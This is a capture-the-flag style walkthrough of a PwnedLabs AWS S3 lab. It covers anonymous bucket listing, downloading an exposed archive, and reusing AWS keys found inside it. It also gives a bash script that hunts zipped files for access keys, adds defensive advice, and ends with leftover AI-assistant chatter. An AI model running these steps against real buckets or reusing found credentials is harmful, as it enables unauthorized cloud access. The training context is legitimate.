---
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# AWS S3 Enumeration Basics

AWS S3 misconfigurations remain one of the most common entry points for adversaries targeting cloud environments. This walkthrough of the [_AWS S3 Enumeration Basics_](aws-s3-enumeration-basics.md) lab from PwnedLabs demonstrates not just the mechanics of bucket enumeration, but the reasoning process required to diagnose endpoint issues, escalate from anonymous access to credential abuse, and extract defensive lessons relevant to real-world engagements. The focus is on the decision-making path rather than a rote command sequence, making it directly useful for pentesters and red team operators.

## Reconnaissance

### S3 Bucket Indicators

When spawning the lab, we get the following URL as a target: [http://dev.huge-logistics.com/](http://dev.huge-logistics.com/).&#x20;

<figure><img src="../../.gitbook/assets/pwnedlabs_s3_enum_homepage.png" alt=""><figcaption></figcaption></figure>

Upon enumerating the site manually, there are various indicators that point that this is hosted into an AWS S3 bucket. For instance, opening an image (_right click_ → _Open image in new tab_) the link points to `s3.amazonaws.com`:

<figure><img src="../../.gitbook/assets/pwnedlabs_s3_enum_image.png" alt=""><figcaption></figcaption></figure>

In addition, inspecting the page's source code also includes `s3`-related links:

<figure><img src="../../.gitbook/assets/pwnedlabs_s3_enum_source.png" alt=""><figcaption></figcaption></figure>

The page's source code can be also be retrieved via CLI using `curl`:

{% code overflow="wrap" %}
```bash
$ curl -s http://dev.huge-logistics.com/ | grep s3
  <link rel="stylesheet" href="https://s3.amazonaws.com/dev.huge-logistics.com/static/style.css">
<link rel="shortcut icon" href="https://s3.amazonaws.com/dev.huge-logistics.com/static/favicon.png">
<img src="https://s3.amazonaws.com/dev.huge-logistics.com/static/logo.png" width="100">
<a href="#"><img src="https://s3.amazonaws.com/dev.huge-logistics.com/static/logo.png" id="res_logo"></a>
  <script  src="https://s3.amazonaws.com/dev.huge-logistics.com/static/script.js"></script>
```
{% endcode %}

### Anonymous Recon

Attempting to confirm the existence of the `dev.huge-logistics.com` bucket returns an error:

{% code overflow="wrap" %}
```bash
# List the bucket's contents
$ aws s3 ls s3://dev.huge-logistics.com/ --no-sign-request

Could not connect to the endpoint URL: "https://s3.temp.amazonaws.com/dev.huge-logistics.com?list-type=2&prefix=&encoding-type=url"
```
{% endcode %}

This occurs because the AWS CLI attempts to resolve the bucket via the default endpoint, but the lab environment redirects DNS through a private or emulated endpoint. The CLI interprets the request correctly but cannot reach the intended API service due to the internal network configuration. Explicitly specifying the region ensures the CLI constructs the correct S3 API endpoint:

{% code overflow="wrap" %}
```bash
# Enumerate the AWS region
$ nslookup dev.huge-logistics.com
Server:         10.255.255.254
Address:        10.255.255.254#53

Non-authoritative answer:
dev.huge-logistics.com  canonical name = dev.huge-logistics.com.s3-website-us-east-1.amazonaws.com.
<SNIP>

# Specify the region parameter and list the bucket's content again
$ aws s3 ls s3://dev.huge-logistics.com/ --no-sign-request --region us-east-1
                           PRE admin/
                           PRE migration-files/
                           PRE shared/
                           PRE static/
2023-10-16 18:00:47       5347 index.html
```
{% endcode %}

The corrected request aligns the CLI with the actual S3 API endpoint (`https://dev.huge-logistics.com.s3.us-east-1.amazonaws.com`) and successfully retrieves the bucket listing.



Once the endpoint mismatch is resolved, anonymous access reveals accessible objects within the bucket. Enumeration techniques include recursive listing, targeted downloads, and inspection of object metadata:

{% code overflow="wrap" %}
```bash
# List objects at the bucket root
aws s3 ls s3://dev.huge-logistics.com --no-sign-request --region us-east-1

# Recursively list contents
aws s3 ls s3://dev.huge-logistics.com --no-sign-request --region us-east-1 --recursive

# Download suspicious object (e.g., migration.zip)
aws s3 cp s3://dev.huge-logistics.com/migration.zip . --no-sign-request --region us-east-1
```
{% endcode %}

### Credential Exposure and Escalation

Inside the archive, a PowerShell migration script contains embedded AWS access keys. While no CVE identifier is associated with this misconfiguration, it represents a credential exposure vulnerability due to insecure secret storage in code artifacts. Using the discovered keys with the AWS CLI enables authenticated access:

```bash
# Configure CLI with compromised keys
aws configure

# Enumerate restricted paths
aws s3 ls s3://dev.huge-logistics.com/admin/ --region us-east-1
```

With authenticated enumeration, restricted paths such as `admin/` become accessible, demonstrating how leaked credentials escalate privileges beyond what was initially available.

### Automating Enumeration

Manual steps can be automated to ensure consistent execution during engagements. The following script validates DNS resolution, attempts anonymous listing, downloads any ZIP archives, and searches for embedded credentials.

```bash
#!/bin/bash
# s3_enum.sh — Automates safe anonymous enumeration of an S3 bucket

set -euo pipefail

BUCKET="$1"
REGION="${2:-us-east-1}"
API_ENDPOINT="${BUCKET}.s3.${REGION}.amazonaws.com"

echo "[*] Enumerating bucket: ${BUCKET} in region ${REGION}"
echo "[*] API endpoint assumed: https://${API_ENDPOINT}"

dig "${BUCKET}" +short | xargs -n1 dig +noall +answer || true

if aws s3 ls "s3://${BUCKET}" --no-sign-request --region "${REGION}"; then
  echo "[+] Public listing succeeded!"
else
  aws s3 ls "s3://${BUCKET}" --no-sign-request --endpoint-url "https://${API_ENDPOINT}"
fi

TMPDIR=$(mktemp -d)
ZIPS=$(aws s3 ls "s3://${BUCKET}/" --no-sign-request --region "${REGION}" | awk '{print $4}' | grep -E '\.zip$' || true)
for ZIP in ${ZIPS}; do
  aws s3 cp "s3://${BUCKET}/${ZIP}" "${TMPDIR}/" --no-sign-request --region "${REGION}"
  unzip -qq "${TMPDIR}/${ZIP}" -d "${TMPDIR}/"
  grep -R -E "AKIA[0-9A-Z]{16}|aws_secret_access_key" "${TMPDIR}" || true
done
```

### Defensive Considerations

Credential exposure in code artifacts highlights the need for proper secret management. Hardcoding credentials should be replaced with AWS Secrets Manager or Parameter Store, and automated scans should enforce this policy across repositories. At the storage layer, enabling **S3 Block Public Access** at both the account and bucket level prevents inadvertent anonymous access. For detection, CloudTrail data events combined with S3 access logs provide visibility into suspicious `ListBucket` and `GetObject` activity, while GuardDuty enriches this data with anomaly detection. Detection engineering should focus on identifying repetitive object enumeration patterns and downloads from untrusted IP ranges, which are indicative of adversarial behavior.

### Key Takeaways

The value of this lab extends beyond the act of retrieving a ZIP file. The real skill lies in recognizing the difference between website and API endpoints, troubleshooting CLI errors, and pivoting from anonymous enumeration to authenticated escalation through credential discovery. While many walkthroughs document the exact commands, a high-value approach emphasizes reasoning and adaptability, which are critical in real-world operations. By combining offensive methodology with defensive recommendations, this walkthrough delivers insights useful to both red teamers and defenders tasked with securing AWS environments.

***

✅ This draft now has both **narrative explanations and practical code snippets**, making it publish-ready.

Do you also want me to enrich the walkthrough with **screenshots or diagrams** (e.g., DNS resolution chain, bucket listing output, attack flow) so it’s visually engaging for readers?
